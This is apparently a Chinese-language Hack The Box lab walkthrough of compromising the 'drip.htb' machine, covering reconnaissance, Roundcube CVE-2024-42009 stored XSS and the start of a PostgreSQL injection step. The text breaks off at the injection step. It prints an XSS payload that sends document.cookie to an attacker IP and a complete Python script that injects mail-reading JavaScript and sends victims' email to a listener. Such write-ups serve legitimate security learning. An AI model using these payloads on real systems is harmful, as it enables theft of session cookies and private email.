---
title: 记一次艰难的多级域内渗透过程
url: https://mp.weixin.qq.com/s/nXdhCQxZ9llGopnpygOT_w
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:56:31.392945
---

# 记一次艰难的多级域内渗透过程

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2I159AwKj54IqEj4ytibLfRaBC2MwZO9SiaJguN05x24gugI9HtCLfsyIEEibq6lZkXmD3tSLCfjKlcsGfuXc7icIgzyuxzATpSdSrkqfQTJHCk/0?wx_fmt=jpeg)

# 记一次艰难的多级域内渗透过程

点击关注👉
点击关注👉

马哥网络安全

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj55PjxpoPFYtgKd65wuUpOVX4uhlurdxiaSDmM0c3SQQTziaHjs8pFm96cNXJLC71y0VyuHkacU2TAEzdwmn1xHt1gDjTUmhAvyRg/640?wx_fmt=png&from=appmsg)

# 外网打点

## 端口扫描

使用nmap进行端口探测，发小存在22和80端口开放。

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj55QPSvuAfoRn3TTsibC4ic6osBYJwtic8b7N43u7KHUquvKOV4hxpupdWAZWYZIJibiaTbibudWpCpibcTVCG5ztMoX6dIeicWN3xtu9Aw/640?wx_fmt=png&from=appmsg)

然后探测其确定版本。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj57Oc7RGr3Rs73zqVJMqibKSqMOFc8TibpHYz5BALWnLDJVIiacSGQZhQpIyyB3kicr8LMN0ibOUPpIucibt0qqpzxPVf7wJ4XCIIhJMU/640?wx_fmt=png&from=appmsg)

## 子域名枚举

接着进行子域名枚举。

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj57t6pXrgiax2ZGjXU0zONRicqv2FchaMFagdjJxBib67GVBGg3mMUhnI192YboTiaxicgmOxQClXTQHSLGpicOZEGU1wLDvGYv4LoD6E/640?wx_fmt=png&from=appmsg)

然后发现存在drip这个域名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj54sKaZmGcTZg2Hx88KR9d4KicflnGaLd3azzzpaWNRHXvdfEKNnEx9oSpKPGtSD3uP0A31GtDpdgC3TsA7HEfyibB2akybBdw3PE/640?wx_fmt=png&from=appmsg)

访问singup路径，提示404.

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj56KzibAgdmlOv8ILHsgRTTBwafeGKNkoONefw4HbiauLdzvrNjraUQI4VotGGQVQicgR3V6Vial6eichrW8v4OnZaUY2icdnDwPpbTkE/640?wx_fmt=png&from=appmsg)

接着测试另一个域名：mail.drip.htb.

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj54DXYkrNfrWnqzvxwEuvudR4E02EVO0m0sEQGd0zGCSXOVWF64jr4JChRFaCDanjOm8ujB9vdA8HwvrZSELt51UxaribcQDlIe4/640?wx_fmt=png&from=appmsg)

## 目录遍历

接着进行目录遍历。

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj57EicKvEf8TcvINdZn5N6eFH10qoreRrddbhutrmMbsMsnSgJ4BzOM3qWAVFHcFSP6rbO0IHoO059yrGQnict673SfRXDHg6rlNE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj55BYYwgSm550TRLibhRJicHC92AKDOtew2R4dMRkqniahOvdMUOjCia1k3F7Yhmb3ymMH0glasIKJ9x44jlHhxtGHk4dyWLhNCM2n4/640?wx_fmt=png&from=appmsg)

## CVE-2024-42009

接着进行漏洞利用，发现是 RoundCube框架的，存在一个cve漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj57vHs1GugmXiaMI2l3b0zO6JVCjibJ2thkLRW9EXz2YeWsZBQR258MicEEr5ch4h4LJj368ibWZicfqPE2WjvAhTTKH61ernkG9mlv0/640?wx_fmt=png&from=appmsg)

通过精心构造的电子邮件窃取并发送受害者的电子邮件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj56PRrd8jn4g96Weic847G2E3lJvZnZSSwTNHjiavdvgFSEZsGK0BBeqLd1icYTjDD7gP1icgmP7vXIH6CFhS31G5vYJO4dW82xkn3s/640?wx_fmt=png&from=appmsg)

# 漏洞利用

构建poc，然后进行漏洞尝试。

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj57ML79MPcsWAczPu8gTLnLbE68ZXjs5lOIgNhaFeufmSicQgPUDeR73aDricl7dsMQutTKhe4NUicX96DHs1Yuhd09IUAib0v9QAKA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj563ofNBPRLaLgLBZhbiaiaMEBHhr7UOQ4GoB0iaSAcic1GNJPUpLyAn5ibN2icLWHdePPiao7bSNhiaKJ6Z9bib9J7SqC0WhHh9QdYSsdRU/640?wx_fmt=png&from=appmsg)

## payload编写

构建payload，然后通过该payload进行文件读写操作

```
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=document.body.appendChild(Object.assign(document.createElement('script'),{src:'http://10.10.14.8:7777/?c='+document.cookie})) foo=bar">Foo</body>
```

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj57VnQvEOCWes7mJDYfooWhfImUgvCibt4wjEiavfxGR5F6icjDTdPNvrOceMicsz7JiaWoycwSiatuOX6bLZWNLuicuyV2jztSWnHbSQY/640?wx_fmt=png&from=appmsg)

## 读取邮件

通过构建好的payload进行文件读取

```
import sysimport requestsfrom http.server import BaseHTTPRequestHandler, HTTPServerimport base64import threadingfrom lxml import html
# Configuration - 已修改IP和端口TARGET_URL = 'http://drip.htb/contact'LISTEN_PORT = 7000  # 端口改为7000LISTEN_IP = '10.10.16.4'  # IP改为10.10.16.4
# Payload for the POST request - 注意这里的回调地址也同步修改了start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='message = sys.argv[1]# 回调地址中的IP和端口已同步更新end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.16.4:7000/c=${btoa(t)}`)) foo=bar">Foo</body>'
post_data = {'name': 'asdf','email': 'asdf','message': f"{start_mesg}{message}{end_mesg}",'content': 'html','recipient': 'bcase@drip.htb'}
print(f"{start_mesg}{message}{end_mesg}")
# Headers for the POST requestheaders = {'Host': 'drip.htb','Cache-Control': 'max-age=0','Upgrade-Insecure-Requests': '1','Origin': 'http://drip.htb','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Referer': 'http://drip.htb/index','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE','Connection': 'close'}
# Function to send the POST requestdef send_post():    response = requests.post(TARGET_URL, data=post_data, headers=headers)    print(f"[+] POST Request Sent! Status Code: {response.status_code}")
# Custom HTTP request handler to capture and decode the incoming dataclass RequestHandler(BaseHTTPRequestHandler):    def do_GET(self):        if '/c=' in self.path:            encoded_data = self.path.split('/c=')[1]            decoded_data = base64.b64decode(encoded_data).decode('latin-1')            print(f"[+] Received data {decoded_data}")            tree = html.fromstring(decoded_data)            # XPath query to find the div with id 'messagebody'            message_body = tree.xpath('//div[@id="messagebody"]')            # Check if the div exists and extract the content            if message_body:                print(f"message_body length is:{len(message_body)}")                for bd in message_body:                    # Extract inner text, preserving line breaks                    message_text = bd.text_content().strip()                    print("[+] Extracted Message Body Content:\n")                    print(message_text)            else:                print("[!] No div with id 'messagebody' found.")        else:            print("[!] Received request but no data found.")        self.send_response(200)        self.end_headers()        self.wfile.write(b'OK')
    def log_message(self, format, *args):        return  # Suppress default logging
# Function to start the HTTP serverdef start_server():    server_address = (LISTEN_IP, LISTEN_PORT)  # 使用修改后的IP和端口    httpd = HTTPServer(server_address, RequestHandler)    print(f"[+] Listening on {LISTEN_IP}:{LISTEN_PORT} for exfiltrated data...")  # 显示修改后的地址    httpd.serve_forever()
# Run the HTTP server in a separate threadserver_thread = threading.Thread(target=start_server)server_thread.daemon = Trueserver_thread.start()
# Send the POST requestsend_post()
# Keep the main thread alive to continue listeningtry:    while True:        passexcept KeyboardInterrupt:    pass
```

成功获取邮件信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj56ibIQG9L18NLkFNpNbRKH7oy6cPS1wv5OJ3ZgCj9FZxcX4PWZP4AbaftxH7gjNQic1BVpIytzYxS3oQl6bySd7AGTIBs6Wz8Vn4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj57Hy7TGfyKibaNAjmEeSMvLSaYKGpgeOlGy9PXA0kVArl5v0sdiazuOPa1bjlJapPRjvcIqvMyU8Nc7AdicYaylMYhHXDmE0eTnPw/640?wx_fmt=png&from=appmsg)

## 命令执行漏洞

利用XSS读邮件,在id为2的邮件中发现Analytics dashboard，并且其中提到需要重置密码才能登录：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj57vZDgzibmP61AwvibSTIIFQhRzw0qrxPbCJfjbz3FtDQ2EmP4kAVhohoSl7svaS2HKuic6FGmIBzkFees6RMcgzicnPiaq76J5pBOI/640?wx_fmt=png&from=appmsg)

进入功能模块处，然后尝试进行修改密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj54icv3UDVfQyhiayNC025OwoeRlSAZOGWLF1t1QZO6F2CNfk7icxSFlUkh6aTeR3Radd2pZVFpQSb3FjWVQop8libVUgicgmswSc1NM/640?wx_fmt=png&from=appmsg)

## sql注入

验证存在注入,并且可以识别出是PostgreSQL

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj56gE05x4iaiaQ9r8dJuI121pybGfr4IlCPcKMptwmBVRg8y5ZNJZqoXgPA3wJDZxoq2UI4fTx0kzviatcZWzuWPKkyFnrLX2TAiaibY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj56hB...